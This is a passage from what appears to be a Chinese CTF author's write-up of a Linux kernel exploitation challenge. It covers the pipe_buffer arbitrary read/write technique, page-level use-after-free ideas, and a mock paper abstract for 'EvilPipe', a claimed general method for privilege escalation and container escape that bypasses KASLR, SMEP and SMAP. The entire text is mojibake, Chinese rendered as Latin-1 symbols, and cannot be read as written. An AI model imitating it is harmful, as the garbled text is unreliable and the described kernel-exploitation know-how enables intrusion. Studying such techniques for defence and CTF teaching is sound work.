ä¸ºç¬”è€…å±•ç°äº†ä¸€ä¸ªå¾ˆæœ‰è¶£çš„æ“ä½œï¼šé€šè¿‡ç¡çœ ä¸€å®šçš„æ—¶é—´ä½¿å¾—æ—§çš„ TLB æ— æ•ˆåŒ–</p><p><img src="https://s2.loli.net/2023/05/01/SFKbgnzPJdIYUZT.png" alt="TeamGoulash åœ¨ WP ä¸­çš„è¡¨æƒ….jpg"></p></blockquote><p>ä¸¤åªæˆ˜é˜Ÿçš„è§£æ³•å¤§ä½“ä¸Šå…¶å®éƒ½åœ¨é¢„æœŸä¹‹å†…ï¼ˆç¬”è€…ä¸€å¼€å§‹æƒ³çš„å°±æ˜¯åˆ©ç”¨ <code>msg_msg</code> ï¼‰ï¼ŒåŒæ—¶è¿™é“é¢˜ç›®æ²¡æœ‰å‡ºç°å»å¹´é‚£æ ·çš„å¤§é¢ç§¯éé¢„æœŸæƒ…å†µï¼Œå¯å–œå¯è´ºå¯å–œå¯è´ºğŸ‘ğŸ‘ğŸ‘</p><h1 id="0x04-æ€»ç»“ä¸åæ€"><a href="#0x04-æ€»ç»“ä¸åæ€" class="headerlink" title="0x04. æ€»ç»“ä¸åæ€"></a>0x04. æ€»ç»“ä¸åæ€</h1><h2 id="pipe-buffer-arbitray-read-amp-writeï¼Ÿ"><a href="#pipe-buffer-arbitray-read-amp-writeï¼Ÿ" class="headerlink" title="pipe_buffer arbitray read &amp; writeï¼Ÿ"></a>pipe_buffer arbitray read &amp; writeï¼Ÿ</h2><p>æ¯«ä¸è°¦è™šåœ°è¯´ï¼Œç¬”è€…è®¤ä¸ºè‡ªå·±å‡ºçš„è¿™é“é¢˜ç›®åœ¨å¯¹äºå†…æ ¸ä¸­å†…å­˜æŸåç±»å‹æ¼æ´çš„ â€œé€šè§£â€ çš„æ¢ç´¢ç›¸æ¯”<a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP">å»å¹´</a>è€Œè¨€æ˜¯æœ‰ç€ä¸€å®šè·ç¦»çš„çªç ´çš„â€”â€”æˆ‘ä»¬æˆåŠŸåœ¨ä¸€ä¸ªéå¸¸æç«¯çš„ç¯å¢ƒä¸‹å®Œæˆäº†å†…æ ¸æ¼æ´åˆ©ç”¨</p><p>è€Œå¦‚æœå°†å®˜æ–¹è§£åœ¨ä¸åŒæ¼æ´åœºæ™¯ä¸‹è¿›è¡Œæ¨å¹¿ï¼Œå¾—ç›Šäº <code>pipe_buffer</code> å¤§å°çš„å¯è°ƒèŠ‚æ€§ä»¥åŠæ— éœ€ <code>bzImage</code> ä¿¡æ¯ä¾¿èƒ½å®Œæˆææƒçš„ä¾¿æ·æ€§ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°çš„æ˜¯<strong>è¿™ä¸ªæ–¹æ³•å¯ä»¥è¢«å¾ˆå¿«åœ°åº”ç”¨å¹¶æ¨å¹¿åˆ°ç»å¤§éƒ¨åˆ†çš„æ¼æ´ä¸Šï¼Œå¹¶åœ¨çœŸå®åœºæ™¯ä¸‹å®Œæˆæ¼æ´åˆ©ç”¨</strong>ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆç¬”è€…è¦é­”æ”¹ã€Ševaï¼šç»ˆã€‹çš„å®£ä¼ è¯­æ¥ä½œä¸ºé¢˜ç›®æè¿°â€”â€”<strong>æˆ‘ä»¬æˆ–è®¸çœŸçš„ä¸ºå†…æ ¸å†…å­˜æŸåå‹æ¼æ´æ‰¾åˆ°äº†ä¸€ç§è¶³å¤Ÿå¼ºå¤§çš„é€šæ³•ï¼šï¼‰</strong></p><p>ä¸è¿‡è¿™ç§æ–¹æ³•å¹¶éæ˜¯ç¬”è€…ç¬¬ä¸€ä¸ªå‘ç°çš„ï¼ˆè™½ç„¶ç¬”è€…ä¸€å¼€å§‹ç¡®ä¹è¿™ä¹ˆä»¥ä¸ºï¼‰ï¼Œæ®ç¬”è€…äº†è§£ç±»ä¼¼çš„æ”¹å†™ <code>pipe_buffer.page</code> çš„æ–¹æ³•ä¼¼ä¹æ—©å·²è¢«åº”ç”¨åˆ°å®æˆ˜çš„å®‰å“æ”»é˜²å½“ä¸­ï¼ŒåŒæ—¶<a href="https://interruptlabs.co.uk/labs/pipe_buffer/">æ¥è‡ª Interrupt Labs çš„ç ”ç©¶å‘˜ä¹Ÿåœ¨å»å¹´å‘ç°äº†è¿™ç§æ–¹æ³•</a></p><blockquote><p>è¯¥ Lab çš„å®‰å…¨ç ”ç©¶å‘˜ä¸€å¼€å§‹ä¹Ÿä»¥ä¸ºè‡ªå·±ç‹¬ç«‹å‘ç°äº†ä¸€ç§æ–°æ–¹æ³•ï¼Œç»“æœä¸€çœ‹ <a href="https://i.blackhat.com/USA-22/Wednesday/US-22-Jin-Monitoring-Surveillance-Vendors.pdf">BlackHat ä¸Šå¥½åƒè®²è¿‡åœ¨å®‰å“ä¸Šå·²ç»å­˜åœ¨åœ¨é‡åˆ©ç”¨äº†</a>ï¼Œ<del>å’Œç¬”è€…åŒç—…ç›¸æ€œå±äºæ˜¯</del></p></blockquote><p>è™½ç„¶è¯´è¿™ç§æ–¹æ³•ä¼¼ä¹æ²¡æœ‰è¢«æ­£å¼å‘½åï¼Œä½†æ˜¯æ—¢ç„¶æ—©å°±å­˜åœ¨åœ¨é‡åˆ©ç”¨çš„è¯é‚£è‡ªç„¶ç¬”è€…æ˜¯æ²¡æœ‰å‘½åèµ„æ ¼äº†ï¼Œè‡³å°‘ç¬”è€…ä¸ä¼šä¸ºäº†æ‰€è°“ â€œé’å²ç•™åâ€ è€Œæ“…è‡ªå°†è¿™ç§æ—©å°±å‡ºç°è¿‡çš„åˆ©ç”¨æ–¹æ³•å† ä¸Šè‡ªå·±çš„åå­—ï¼ˆç¬‘ï¼‰</p><!--glibc åˆ©ç”¨è¿‘å‡ å¹´å›½å†…æ–°å‡ºç°çš„å°‘æ•°å‡ ä¸ªæ‰€è°“ â€œhouse of xxâ€ åœ¨ç¬”è€…çœ‹æ¥çœŸçš„æ˜¯éš¾ä»¥å½¢å®¹......è¿™ä¹Ÿæ˜¯ç¬”è€…ä¸ºä»€ä¹ˆæœ€è¿‘åŸºæœ¬ä¸Šæ²¡æœ‰åœ¨åšå¸¸è§„çš„ Linux ç”¨æˆ·æ€ pwn çš„ç¼˜æ•…ï¼ˆå½“ç„¶è™šæ‹ŸåŒ–é€ƒé€¸è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼‰ï¼Œæ–°å‡ºç°çš„ä¸€äº›ä¸œè¥¿æœ‰ç‚¹è¿‡äºæµ®èºä¸”æµ®å¤¸äº†ï¼š( \nå½“ç„¶è¿™å¹¶ä¸ä»£è¡¨ç¬”è€…è®¤ä¸ºè¿™äº›äººæˆ–æ˜¯è¿™äº›äº‹æƒ…æ¶å¿ƒï¼Œä¹Ÿä¸ä»£è¡¨ç¬”è€…å¯¹è¿™æ ·çš„ç°è±¡çš„ä¸€ç§æ‰¹åˆ¤--><h2 id="page-level-UAF"><a href="#page-level-UAF" class="headerlink" title="page-level UAF?"></a>page-level UAF?</h2><p>ä¸è¿‡è™½ç„¶è¯´åˆ©ç”¨ <code>pipe_buffer</code> è¿›è¡Œå†…å­˜ä»»æ„è¯»å†™çš„æ“ä½œå¹¶éä½œè€…é¦–åˆ›ï¼Œä½†æ˜¯ <em>åœ¨å†…å­˜é¡µè¿™ä¸€çº§è¿›è¡Œ double free ä»¥åŠ UAF åˆ©ç”¨æ®ç¬”è€…æ‰€çŸ¥åº”è¯¥æ˜¯ç¬”è€…é¦–åˆ›</em> ï¼Œæœ‰äº† page-level UAFï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“åœ°åœ¨ä¸åŒçš„ <code>kmem_cache</code> ä¹‹é—´è¿›è¡Œè·¨ <code>kmem_cache</code> çš„ UAF åˆ©ç”¨ï¼Œä»è€Œæ‰“ç ´ <code>kmem_cache</code> ç”šè‡³æ˜¯ç›´æ¥è¿›è¡Œå†…å­˜é¡µåˆ†é…çš„å…¶ä»–å­ç³»ç»Ÿä¹‹é—´çš„é—´éš”ï¼ˆä¾‹å¦‚é¡µè¡¨ï¼‰ï¼Œç›®å‰ç¬”è€…æ‰€è®¾æƒ³çš„åˆ©ç”¨æ‰‹æ³•æœ‰ï¼š</p><ul><li>å°†ä¸€å¼  page é‡Šæ”¾æˆä¸ºå¦ä¸€å¼  pageï¼Œä»è€Œå®Œæˆå¯¹æŒ‡å®šå†…æ ¸å¯¹è±¡çš„ UAFåˆ©ç”¨ï¼ˆè¿™ä¾¿æ˜¯æœ¬é¢˜çš„åšæ³•ï¼‰<ul><li>å¯ä»¥æ˜¯é’ˆå¯¹ page è¿›è¡Œ double free</li><li>ä¹Ÿå¯ä»¥æ˜¯ slab objects çš„å…¨éƒ¨é‡Šæ”¾å¯¼è‡´çš„ slab free åçš„ page UAF</li><li>â€¦</li></ul></li><li>å°†ä¸€å¼  page é‡Šæ”¾ä¸ºå†…æ ¸å­ç³»ç»Ÿä¸­çš„æŸä¸ªç»„ä»¶<ul><li>ä¾‹å¦‚ï¼šé¡µè¡¨</li><li>â€¦</li></ul></li></ul><p>ä½œä¸ºåˆšåˆšå‡ºç°åœ¨ CTF å½“ä¸­çš„æ–°çš„åˆ©ç”¨æ‰‹æ³•ï¼Œpage-level UAF è¿˜æœ‰æ›´å¤šå€¼å¾—æˆ‘ä»¬å»æ¢ç´¢çš„åœ°æ–¹</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>æ€»çš„æ¥è¯´ï¼Œç¬”è€…å¯¹äºè‡ªå·±ä»Šå¹´æ‰€å‡ºçš„è¿™ä¸€é“é¢˜è¿˜æ˜¯æŒºæ»¡æ„çš„ï¼Œå¸Œæœ›æœªæ¥èƒ½å¤Ÿç»™å¤§å®¶å¸¦æ¥æ›´å¤šæ›´æœ‰è¶£çš„å†…æ ¸æ¼æ´åˆ©ç”¨æ‰‹æ³• ï¼šï¼‰</p><h1 id="0xFF-ä¸€äº›å°å½©è›‹"><a href="#0xFF-ä¸€äº›å°å½©è›‹" class="headerlink" title="0xFF. ä¸€äº›å°å½©è›‹"></a>0xFF. ä¸€äº›å°å½©è›‹</h1><blockquote><p>ç¬”è€…ä¸ªäººå‘ç–¯éƒ¨åˆ†ï¼Œè¿™é‡Œå¯ä»¥ä¸ç”¨çœ‹äº†ï¼ˆç¬‘ï¼‰</p></blockquote><p>æœ€è¿‘å†™è®ºæ–‡å†™å¾—å¿«ç–¯é­”äº†ï¼Œæ‰€ä»¥ç¬”è€…ä¸ºè¿™é“é¢˜ç›®ä¹Ÿç®€å•å†™äº†ä¸€æ®µï¼šï¼‰</p><blockquote><p>ã€Š<strong>EvilPipe: Another General Exploitation Method On Linux kernel Vulnerabilities</strong>ã€‹</p><p><strong>Abstract</strong></p><p>åœ¨å®æˆ˜ä¸­å¯¹ Linux kernel çš„å†…å­˜æŸåæ¼æ´è¿›è¡Œåˆ©ç”¨å¾€å¾€éœ€è¦é¢ä¸´è¯¸å¤šæŒ‘æˆ˜ï¼Œæ¥è‡ªç¡¬ä»¶ä¸è½¯ä»¶å±‚é¢çš„è¯¸å¤šä¿æŠ¤ä½¿å¾—æ¼æ´åˆ©ç”¨å˜å¾—å›°éš¾ï¼Œå†…æ ¸é•œåƒä¿¡æ¯çš„ç¼ºå¤±ä¹Ÿä»¤åˆæ³•æ”»å‡»è½½è·çš„æ„é€ å˜å¾—ä¸å¯èƒ½ï¼›ç°æœ‰çš„ä¸€äº›å·¥ä½œä¹Ÿåœ¨å°è¯•å¯»æ‰¾æ— éœ€è¿›è¡Œæ§åˆ¶æµåŠ«æŒçš„æ›´å…·æœ‰é€šç”¨æ€§çš„æ”»å‡»æ‰‹æ³•ï¼Œå¦‚ Pipe Primitive é€‰æ‹©å°†æ¼æ´å½¢å¼è½¬æ¢ä¸º DirtyPipe å®Œæˆåˆ©ç”¨ï¼ŒDirtyCred åˆ™å°†æ¼æ´è½¬æ¢ä¸ºå¯¹å†…æ ¸ä¸­çš„ credentials ç»“æ„ä½“çš„æ”¹å†™ä»¥å®Œæˆåˆ©ç”¨ï¼›ä½†è¿™äº›åˆ©ç”¨æ‰‹æ³•å¾€å¾€ä»éœ€è¦ä¸€å®šçº§åˆ«çš„æƒé™ï¼ˆä¾‹å¦‚ï¼Œè‡³å°‘éœ€è¦èƒ½å¤Ÿè¯»å–æˆ–æ‰§è¡Œç‰¹æƒæ–‡ä»¶ï¼‰ï¼Œä»ç„¶ç¼ºä¹è¶³å¤Ÿçš„é€šç”¨æ€§</p><p>æœ¬æ–‡ä»‹ç» EvilPipeâ€”â€”ä¸€ç§æ›´å…·æœ‰é€šç”¨æ€§çš„åˆ©ç”¨æ‰‹æ³•ï¼Œè¿™é¡¹æŠ€æœ¯å…è®¸æˆ‘ä»¬å°†ç»å¤§å¤šæ•°çš„å†…æ ¸ä¸­çš„å†…å­˜æŸåæ¼æ´ï¼ˆç”šè‡³ä»…æ˜¯ä¸€ä¸ª â€˜\0â€™ å­—èŠ‚çš„å †æº¢å‡ºï¼‰ï¼Œè½¬æ¢ä¸ºæ— éœ€ä»»ä½•ç‰¹æƒçš„æ— é™çš„å¯¹ç‰©ç†å†…å­˜çš„ä»»æ„è¯»å†™èƒ½åŠ›ï¼Œå¹¶èƒ½å®Œç¾ç»•è¿‡åŒ…æ‹¬ KASLRã€SMEPã€SMAP åœ¨å†…çš„å¤šé¡¹ä¸»æµç¼“è§£æªæ–½ï¼›æœ‰äº† EvilPipeï¼Œä¸€ä¸ªæ¶æ„çš„æœ¬åœ°æ”»å‡»è€…å¯ä»¥åœ¨æ— éœ€å†…æ ¸é•œåƒä¿¡æ¯çš„æƒ…å†µä¸‹é€šè¿‡å·²çŸ¥çš„å†…æ ¸æ¼æ´å®Œæˆææƒä¸å®¹å™¨é€ƒé€¸ï¼›æˆ‘ä»¬åœ¨å¤šä¸ªä¿æŠ¤å®Œå¤‡çš„ Linux ç³»ç»Ÿä¸‹å¯¹å¤šä¸ª <code>ï¼ˆæ­¤å¤„æš‚å®šï¼‰</code> çœŸå®ä¸–ç•Œä¸­çš„æ¼æ´å®Œæˆäº†å¯¹è¿™ç§åˆ©ç”¨æ‰‹æ³•çš„è¯„ä¼°ï¼Œå¹¶å‘ç° EvilPipe åœ¨å¤šä¸ª <code>ï¼ˆæ­¤å¤„æš‚å®šï¼‰</code> çœŸå®ä¸–ç•Œçš„æ¼æ´ä¸Šå¯ä»¥å®Œæˆåˆ©ç”¨ï¼Œè¿™æ„å‘³ç€è¿™é¡¹æŠ€æœ¯çš„é€šç”¨æ€§ï¼›åœ¨å®Œæˆå¯ç”¨æ€§è¯„ä¼°ä¹‹åï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§æ–°çš„ä¿æŠ¤æœºåˆ¶ï¼Œé€šè¿‡åœ¨æ•°æ®æ‹·è´å‰æ·»åŠ é¢å¤–çš„éªŒè¯æœºåˆ¶ä»¥é˜²æ­¢ EvilPipe ç±»å‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œç»å®éªŒè¯„ä¼°ï¼Œæˆ‘ä»¬æ‰€æå‡ºçš„æ–°æœºåˆ¶å¸¦æ¥çš„è´Ÿæ‹…æ˜¯å¯ä»¥å¿½ç•¥ä¸è®¡çš„</p><p><strong>KEYWORDS</strong></p><p>OS Security; Kernel Exploitation; Privilege Escalation</p><p><strong>1 INTRODUCTION</strong></p><p>ç°å¦‚ä»Š Linux å·²ç„¶æˆä¸ºå…¨ä¸–ç•Œæœ€ä¸ºæµè¡Œçš„å¼€æºæ“ä½œç³»ç»Ÿï¼Œå¾—ç›Šäºå…¶å¼€æºçš„ç‰¹æ€§ä¸ä¼˜ç§€çš„è®¾è®¡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åŒ…æ‹¬äº‘æœåŠ¡å™¨ã€ç§»åŠ¨è®¾å¤‡ã€ç‰©è”ç½‘è®¾å¤‡ã€ç½‘ç»œåŸºç¡€è®¾æ–½åœ¨å†…çš„ç»å¤§éƒ¨åˆ†è®¾å¤‡ä¸Šçœ‹åˆ° Linux å†…æ ¸çš„èº«å½±ï¼Œè€Œæé«˜çš„æµè¡Œæ€§ä¹Ÿä»¤ Linux å¸å¼•äº†æ— æ•°ç½‘ç»œæ”»å‡»è€…ä¸é»‘å®¢ä»¬çš„å…´è¶£ã€‚è™½ç„¶ Linux å†…æ ¸æ¯å¹´è¢«çˆ†å‡ºçš„æ¼æ´é«˜è¾¾æ•°ç™¾ä¸ª[3]ï¼Œä½†åœ¨å®æˆ˜ä¸­å¯¹å†…æ ¸æ¼æ´çš„åˆ©ç”¨å¾€å¾€é¢ä¸´ç€ä¸€ç³»åˆ—å›°éš¾çš„æŒ‘æˆ˜ã€‚ä»å†…æ ¸å±‚é¢è€Œè¨€ï¼Œè¯¸å¦‚ KASLR[1]ã€KPTI [2]ã€ CFI[4] ç­‰ä¿æŠ¤ä¸ºæ§åˆ¶æµåŠ«æŒæ”»å‡»å¢æ·»äº†ä¸å°‘éš¾åº¦ã€‚ä»ç¡¬ä»¶å±‚é¢è€Œè¨€ï¼Œ SMEPã€SMAPã€NX-bit ç­‰ä¿æŠ¤ä¹Ÿä»¤å½¢å¦‚ ret2usr[5]ã€ret2dir[5] è¿™æ ·çš„æ”»å‡»å˜å¾—æä¸ºå›°éš¾ã€‚å†…æ ¸é•œåƒä¿¡æ¯çš„ç¼ºå¤±æ›´æ˜¯ä½¿å¾—æ”»å‡»è€…æ— æ³•è·å–åˆ°å†…æ ¸ä»£ç ç‰‡æ®µçš„å…·ä½“ä¿¡æ¯ï¼Œä»è€Œä½¿å¾—ç±»ä¼¼ ROP&#x2F;JOP è¿™æ ·çš„åˆ©ç”¨æ‰‹æ³•éš¾ä»¥è¢«åº”ç”¨ã€‚</p><p>ç›¸è¾ƒäºåŠ«æŒå†…æ ¸çš„æ‰§è¡Œæµï¼Œåœ¨å®æˆ˜ä¸­æ›´å—äººé’ççš„å†…æ ¸æ¼æ´åˆ™æ˜¯æ— éœ€ç‰¹å®šäºæŸä¸ªå†…æ ¸äºŒè¿›åˆ¶ä¿¡æ¯çš„é€»è¾‘ç±»æ¼æ´ã€‚æ›¾ç»éå¸¸ç«çƒ­çš„ CVE-2016-5195ï¼ˆä¹Ÿè¢«ç§°ä¸º â€œDirtyCOWâ€ï¼‰ä¾¿æ˜¯ä¸€ä¸ªéå¸¸ç»å…¸çš„è¿™æ ·çš„é€»è¾‘æ¼æ´ï¼Œå…¶é€šè¿‡ Linux å†…æ ¸ä¸­çš„æ¡ä»¶ç«äº‰æ¼æ´å®Œæˆå¯¹ç‰¹æƒæ–‡ä»¶çš„è¶Šæƒå†™å…¥ä»¥è¿›è¡Œææƒï¼Œè€Œä¸éœ€è¦ç›´æ¥å¯¹æŠ—å†…æ ¸ä¸­çš„è¯¸å¤šå®‰å…¨æœºåˆ¶ï¼Œè¿™ä½¿å¾—è¿™ä¸ªæ¼æ´èƒ½å¤Ÿé€‚ç”¨äºå®æˆ˜ä¸­çš„å¤šä¸ªä¸åŒçš„å¤æ‚åœºæ™¯ã€‚CVE-2022-0847ï¼ˆä¹Ÿè¢«ç§°ä¸ºâ€œDirtyPipeâ€ï¼‰ç”±äºå…¶ç±»ä¼¼çš„é€šç”¨æ€§äºå»å¹´åœ¨å®‰å…¨ç•Œå˜å¾—æµè¡Œï¼Œå…¶ä¸ºä¸€ä¸ªå¯¹ pipe ç»“æ„ä½“ä¸­æ ‡å¿—ä½çš„é”™è¯¯è®¾ç½®ï¼Œè¿™å¯ä»¥ä½¿å¾—æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å®Œæˆå¯¹ç‰¹æƒæ–‡ä»¶çš„è¶Šæƒå†™å…¥ä»¥è¿›è¡Œææƒï¼Œè€Œä¸éœ€è¦ç›´æ¥å¯¹æŠ—å†…æ ¸ä¸­çš„å¤šç§ä¿æŠ¤ã€‚</p><p>åœ¨æœ¬æ–‡ä¸­æˆ‘ä»¬æå‡ºäº†ä¸€ç§æ›´ä¸ºé€šç”¨ã€å¼ºå¤§çš„åˆ©ç”¨æ–¹æ³•ï¼Œç§°ä¹‹ä¸º EvilPipeã€‚è¿™é¡¹æŠ€æœ¯åˆ©ç”¨äº†å†…æ ¸ä¸­ç®¡é“ç»“æ„ä½“çš„å¯é‡åˆ†é…æ€§ä¸é«˜åº¦çµæ´»æ€§ï¼Œè¿™å…è®¸æˆ‘ä»¬å°†ç»å¤§å¤šæ•°çš„å†…æ ¸ä¸­çš„å†…å­˜æŸåæ¼æ´ï¼ˆç”šè‡³ä»…æ˜¯ä¸€ä¸ª â€˜\0â€™ å­—èŠ‚çš„å †æº¢å‡ºï¼‰ï¼Œè½¬æ¢ä¸ºæ— éœ€ä»»ä½•ç‰¹æƒçš„è¿‘ä¹æ— é™çš„å¯¹ç‰©ç†å†…å­˜çš„ä»»æ„è¯»å†™èƒ½åŠ›ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§åˆ©ç”¨æ–¹æ³•è·å–å¯¹å†…æ ¸çš„å®Œå…¨æ§åˆ¶æƒï¼Œä»è€Œæ— éœ€ç›´æ¥å¯¹æŠ—ä»»ä½•ä¸»æµçš„ä¿æŠ¤æªæ–½ä¾¿èƒ½å®Œæˆå†…æ ¸ææƒä¸å®¹å™¨é€ƒé€¸çš„å·¥ä½œã€‚åŒæ—¶ï¼Œè¿™é¡¹æŠ€æœ¯å¹¶ä¸éœ€è¦ä»»ä½•æ›´é«˜çš„ç³»ç»Ÿæƒé™ï¼ˆä¾‹å¦‚ï¼Œè¯»å– &#x2F;etc&#x2F;passwdï¼‰ï¼Œä¹Ÿä¸ä¾èµ–äºç³»ç»Ÿç¯å¢ƒä¸­çš„ä»»ä½•ç‰¹æƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼Œ pkexecï¼‰ï¼Œä¸”ä¸éœ€è¦ä»»ä½•é¢å¤–çš„ç‰¹å®šäºå†…æ ¸é•œåƒçš„å†…æ ¸ä¿¡æ¯ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨ç»å¤§éƒ¨åˆ†å­˜åœ¨å·²çŸ¥æ¼æ´çš„Linuxç³»ç»Ÿä¸Šç›´æ¥åº”ç”¨è¿™ç§åˆ©ç”¨æ‰‹æ³•å®Œæˆæ”»å‡»ï¼Œå› æ­¤è¿™ç§æ–¹æ³•åœ¨å®æˆ˜å½“ä¸­å…·æœ‰æé«˜çš„å¯ç”¨æ€§ã€‚</p><p>ç›¸æ¯”äºå…¶ä»–çš„åˆ©ç”¨æŠ€æœ¯ï¼Œ EvilPipe æœ‰ç€å¦‚ä¸‹ä¼˜ç‚¹ã€‚é¦–å…ˆï¼ŒEvilPipe çš„æ ¸å¿ƒä»…æ˜¯ pipe ç³»ç»Ÿè°ƒç”¨ï¼Œä½œä¸ºä¸€ä¸ªåŸºç¡€è®¾æ–½ pipe ç³»ç»Ÿè°ƒç”¨åœ¨æ¯ä¸€ä¸ªåŸºäº Linux çš„ç³»ç»Ÿä¸Šéƒ½æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œè¿™æ„å‘³ç€ EvilPipe è¿‘ä¹ä¸å­˜åœ¨ä»»ä½•çš„ä½¿ç”¨é—¨æ§›ã€‚å…¶æ¬¡ï¼ŒEvilPipe æœ‰ç€é«˜åº¦çš„çµæ´»æ€§ï¼Œå¯ä»¥å®Œç¾å¥‘åˆå¤šä¸ªä¸åŒå¤§å°çš„å†…æ ¸æ¼æ´å¯¹è±¡ã€‚å¯¹äº UAF æ¼æ´è€Œè¨€ï¼ŒEvilPipe ä»…è¦æ±‚æ¼æ´å¯¹è±¡ä¸é€šç”¨çš„ GFP_KERNEL_ACCOUNT åˆ†é…æ ‡å¿—ä½æ¥è‡ªåŒä¸€ kmem_cacheï¼ˆå†…æ ¸å½“ä¸­çš„å¤§éƒ¨åˆ†å¯¹è±¡éƒ½æ»¡è¶³è¯¥è¦æ±‚ï¼‰ã€‚å¯¹äºæº¢å‡ºæ¼æ´è€Œè¨€ï¼ŒEvilPipe çš„æœ€ä½è¦æ±‚ä»…ä¸ºä¸€ä¸ª \0 å­—èŠ‚ï¼ˆè¿™åŒæ ·é€‚ç”¨äºè·¨ kmem_cache é—´å†…å­˜é¡µçš„æº¢å‡ºï¼Œæˆ‘ä»¬å°†åœ¨åæ–‡ä½¿ç”¨ä¸€ç§åä¸ºé¡µçº§å †é£æ°´çš„æŠ€æœ¯æ¥å®Œæˆå®ƒï¼‰ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†ç»å¤§éƒ¨åˆ†çš„å†…å­˜æŸåç±»æ¼æ´è½¬æ¢ä¸º EvilPipe ä»¥å®Œæˆåˆ©ç”¨ã€‚æœ€åï¼ŒEvilPipe ä¸ç›´æ¥ä¸ä»»ä½•çš„å†…æ ¸ä¿æŠ¤æªæ–½è¿›è¡Œå¯¹æŠ—ï¼Œä¹Ÿä¸éœ€è¦å…³äºå½“å‰å†…æ ¸çš„ä»»ä½•ä¿¡æ¯ï¼Œä¸”ä¸ä¼šç•™ä¸‹ä»»ä½•ç—•è¿¹ï¼Œè¿™æ„å‘³ç€ EvilPipe å¯ä»¥è¢«åº”ç”¨äºè¿‘ä¹æ‰€æœ‰çš„æ”»å‡»ç¯å¢ƒã€‚</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è®¤ä¸º EvilPipe å¹¶ä¸ä»…ä»£è¡¨é’ˆå¯¹ pipe ç³»ç»Ÿè°ƒç”¨çš„åˆ©ç”¨æ–¹æ³•ï¼Œè€Œæ˜¯ä»£è¡¨äº†ä¸ä¼ ç»Ÿçš„æ¼æ´åˆ©ç”¨æŠ€æœ¯æ‰€ä¸åŒçš„ç ”ç©¶æ–¹å‘ï¼šå°†å†…æ ¸æ¼æ´åˆ©ç”¨æ–¹æ³•ä»ä¼ ç»Ÿçš„ä»£ç æ‰§è¡Œè½¬å‘æ„é€ é€»è¾‘æ¼æ´ï¼Œä»è€Œæ— éœ€ç›´æ¥ä¸ä¼—å¤šå†…æ ¸ä¿æŠ¤æªæ–½è¿›è¡Œç›´æ¥å¯¹æŠ—ï¼Œå¹¶å¤§å¹…å‡å°‘æ¼æ´åˆ©ç”¨å¯¹ç‰¹å®šäºæŒ‡å®šç¯å¢ƒçš„ä¾èµ–åº¦ã€‚æˆ‘ä»¬è®¤ä¸ºåœ¨æ¼æ´åˆ©ç”¨ä¸Šè¿™æ˜¯ä¸€ä¸ªå€¼å¾—ä»¤äººæ¢ç´¢çš„æ–¹å‘ã€‚</p><p>åœ¨å®Œæˆæ¦‚å¿µéªŒè¯ä¹‹åï¼Œæˆ‘ä»¬å°†å¤šä¸ª Linux å†…æ ¸ä¸­çš„å†…å­˜æŸåæ¼æ´æ”¹å†™ä¸º EvilPipeï¼Œå¹¶åœ¨å¤šä¸ªä¿æŠ¤å®Œå¤‡çš„ Linux ç³»ç»Ÿä¸‹å¯¹å¤šä¸ª <code>ï¼ˆæ­¤å¤„æš‚å®šï¼‰</code> çœŸå®ä¸–ç•Œä¸­çš„æ¼æ´å®Œæˆäº†å¯¹è¿™ç§åˆ©ç”¨æ‰‹æ³•çš„è¯„ä¼°ã€‚æˆ‘ä»¬å‘ç° EvilPipe åœ¨å¤šä¸ª <code>ï¼ˆæ­¤å¤„æš‚å®šï¼‰</code> çœŸå®ä¸–ç•Œçš„æ¼æ´ä¸Šå¯ä»¥å®Œæˆåˆ©ç”¨ï¼Œè¿™æ„å‘³ç€è¿™é¡¹æŠ€æœ¯å…·æœ‰å¼ºå¤§çš„èƒ½åŠ›ã€‚åœ¨å®Œæˆå¯åˆ©ç”¨æ€§è¯„ä¼°ä¹‹åï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§æ–°çš„ä¿æŠ¤æœºåˆ¶ï¼Œé€šè¿‡åœ¨æ•°æ®æ‹·è´å‰æ·»åŠ é¢å¤–çš„éªŒè¯æœºåˆ¶ä»¥é˜²æ­¢ EvilPipe ç±»å‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œç»å®éªŒè¯„ä¼°ï¼Œæˆ‘ä»¬æ‰€æå‡ºçš„æ–°æœºåˆ¶å¸¦æ¥çš„è´Ÿæ‹…æ˜¯å¯ä»¥å¿½ç•¥ä¸è®¡çš„ã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼Œæœ¬æ–‡åšäº†å¦‚ä¸‹å·¥ä½œï¼š</p><ul><li>æˆ‘ä»¬æå‡ºäº†ä¸€ç§æ–°çš„é€šç”¨åˆ©ç”¨æŠ€æœ¯â€”â€”EvilPipeï¼Œè¿™é¡¹æŠ€æœ¯å…è®¸æˆ‘ä»¬å°†ç»å¤§å¤šæ•°çš„å†…æ ¸ä¸­çš„å†…å­˜æŸåæ¼æ´ï¼ˆç”šè‡³ä»…æ˜¯ä¸€ä¸ª â€˜\0â€™ å­—èŠ‚çš„å †æº¢å‡ºï¼‰ï¼Œè½¬æ¢ä¸ºæ— éœ€ä»»ä½•ç‰¹æƒçš„æ— é™çš„å¯¹ç‰©ç†å†…å­˜çš„ä»»æ„è¯»å†™èƒ½åŠ›</li><li>æˆ‘ä»¬åœ¨å¤šä¸ªçœŸå®ä¸–ç•Œçš„æ¼æ´ä¸Šåº”ç”¨äº† EvilPipe 